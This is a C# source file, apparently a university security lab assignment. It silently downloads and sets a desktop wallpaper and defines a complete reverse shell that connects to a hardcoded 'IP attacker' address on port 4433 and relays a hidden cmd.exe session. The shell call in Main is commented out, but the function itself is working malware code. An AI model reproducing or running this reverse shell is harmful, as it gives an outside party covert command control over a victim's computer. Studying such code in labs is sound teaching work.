using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Net;

using System.Net.NetworkInformation;

using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
class NT230
{
     // WallpaperManager
    
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public static void SetWallpaper()
        {
            var filename = "cutecat.jpg";
            new WebClient().DownloadFile("https://i.pinimg.com/originals/32/9e/2f/329e2f6a54fdb1f53f4126991fcc6143.png", filename); //down image
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, filename, SPIF_UPDATEINIFILE);
            //if (!SystemParametersInfo(SPI_SETDESKWALLPAPER, 1, filename, SPIF_UPDATEINIFILE))
            //{
               // Console.WriteLine("Can't set wallpaper!");
            //}
            Thread.Sleep(1000);
        }

    //Check Internet Connection
        public static bool IsConnectedToInternet()
    {
        string host = "https://daa.uit.edu.vn";  
        bool result = false;
        Ping p = new Ping();
        try
        {
            PingReply reply = p.Send(host, 3000);
            if (reply.Status == IPStatus.Success)
                return true;
        }
        catch (Exception ex)
        { Console.WriteLine(ex.Message); }

        return result;
    }

    // Reverse shell
        static StreamWriter streamWriter;
        public static void CreateShell()
        {
            using (TcpClient client = new TcpClient("192.168.111.128", 4433)) // IP attacker , port
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput.ToString());
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();

        if (!String.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception err)
            { Console.WriteLine(err.ToString()); }
        }
    }
    static void Main(string[] args)
    {

        // Change background 
        SetWallpaper();
        // Check Internet connection
       // if (IsConnectedToInternet())
        {
           // CreateShell();
        }
       // else // Create file
        {
           // string fileName = @"C:\Lab03.txt";
           // FileInfo fi = new FileInfo(fileName);
           // try
            {
                // Check if file already exists. If yes, delete it.
             //   if (fi.Exists)
                {
             //       fi.Delete();
                }
                // Create a new file
             //   using (FileStream fs = fi.Create())
                {
              //      Byte[] txt = new UTF8Encoding(true).GetBytes("Nhom 8 is coming !!");
             //       fs.Write(txt, 0, txt.Length);

                }
            }
          //  catch (Exception Ex)
            {
           //     Console.WriteLine(Ex.ToString());
            }

        }
    }

}